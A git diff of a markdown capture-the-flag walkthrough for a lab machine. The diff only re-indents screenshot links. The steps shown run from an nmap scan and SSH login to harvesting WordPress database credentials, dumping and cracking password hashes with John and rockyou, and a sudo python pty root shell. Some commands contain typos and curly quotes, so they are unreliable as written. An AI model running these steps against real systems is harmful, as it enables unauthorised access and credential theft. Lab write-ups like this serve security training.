@@ -38,9 +38,9 @@ Tools:
 
 ## **Walkthrough**
 
-1.` nmap -sV 192.168.1.110`
+1. ` nmap -sV 192.168.1.110`
 
-![1](/Images/2/1.png)
+    ![1](/Images/2/1.png)
 
 2. Enumerate: 
 
@@ -56,7 +56,7 @@ Tools:
 
 5. Search: `flag`
 
-![2](/Images/2/2.png)
+    ![2](/Images/2/2.png)
 
 6. In the terminal: `'ssh michael@192.168.1.110'`
 
@@ -68,17 +68,17 @@ Tools:
 
 10. `find  -iname “*flag*” 2>/dev/null`
 
-![3](/Images/2/3.png)
+    ![3](/Images/2/3.png)
 
 11. `cat /var/www/flag2.txt`
 
-![4](/Images/2/4.png)
+    ![4](/Images/2/4.png)
 
 12. `cd /var/www/html/wordpress`
 
 13. `Nano wp-config.php`
 
-![5](/Images/2/5.png)
+    ![5](/Images/2/5.png)
 
 14. `mysql -u root -p`
 
@@ -86,19 +86,19 @@ Tools:
 
 16. `show databases;`
 
-![6](/Images/2/6.png)
+    ![6](/Images/2/6.png)
 
 17. `use wordpress;`
 
-![7](/Images/2/7.png)
+    ![7](/Images/2/7.png)
 
 18. `show tables;`
 
-![8](/Images/2/8.png)
+    ![8](/Images/2/8.png)
 
 19. `SELECT * FROM wp_users;`
 
-![9](/Images/2/9.png)
+    ![9](/Images/2/9.png)
 
 20. Right click and copy the part with the hashes
 
@@ -108,13 +108,13 @@ Tools:
 
 23. nano hashes.txt
 
-![10](/Images/2/10.png)
+    ![10](/Images/2/10.png)
 
 24. `john hashes.txt –wordlist=’/usr/share/wordlist/rockyou.txt’`
 
 25. `john –show hashes.txt`
 
-![11](/Images/2/11.png)
+    ![11](/Images/2/11.png)
 
 26. `sudo steven`
 
@@ -122,23 +122,23 @@ Tools:
 
 28. `Sudo -l`
 
-![12](/Images/2/12.png)
+    ![12](/Images/2/12.png)
 
 29. `sudo python -c 'import pty;pty.spawn("/bin/bash")'`
 
-![13](/Images/2/13.png)
+    ![13](/Images/2/13.png)
 
 30. `find  -iname “*flag*” 2>/dev/null`
 
-![14](/Images/2/14.png)
+    ![14](/Images/2/14.png)
 
 31. `cat /root/flag4.txt`
 
-![15](/Images/2/15.png)
+    ![15](/Images/2/15.png)
 
 32. `grep -r flag3 *`
 
-![16](/Images/2/16.png)
+    ![16](/Images/2/16.png)
 
 33. `nano /var/lib/mysql/ib_logfile0`
 
@@ -146,7 +146,7 @@ Tools:
 
 35. `flag3`
 
-![17](/Images/2/17.png)
+    ![17](/Images/2/17.png)
 
 # FLAGS
 
